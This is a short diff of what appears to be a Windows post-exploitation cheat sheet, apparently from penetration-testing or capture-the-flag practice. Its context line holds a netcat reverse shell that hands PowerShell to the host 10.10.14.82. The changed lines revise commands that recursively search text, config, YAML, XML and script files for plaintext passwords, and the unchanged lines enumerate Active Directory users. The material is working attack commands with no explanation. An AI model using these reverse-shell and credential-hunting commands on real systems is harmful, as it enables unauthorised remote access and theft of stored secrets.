@@ -50,7 +50,10 @@ c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 10001
 ==========(7)======================================================================================================================
 #find password stored in in plaintext in any files
 (gci: Alias for Get-ChildItem)
-gci -path .*.txt,*.ini,*.yml,*.xml,*.ps1,*-recurse -ea SilentlyContinue -Include .cfg | select-string -pattern "password\s*[:=]\s*\S+" -CaseSensitive:$false
+gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string pass
+gci -path . -recurse -ea SilentlyContinue -Include *.txt, *.ini, *.yml, *.xml, *.ps1, *.cfg | select-string -pattern "password\s*[:=]\s*\S+" -CaseSensitive:$false
+
+
 
 #get list of all active directory users
 get-aduser -filter * | select samaccountname
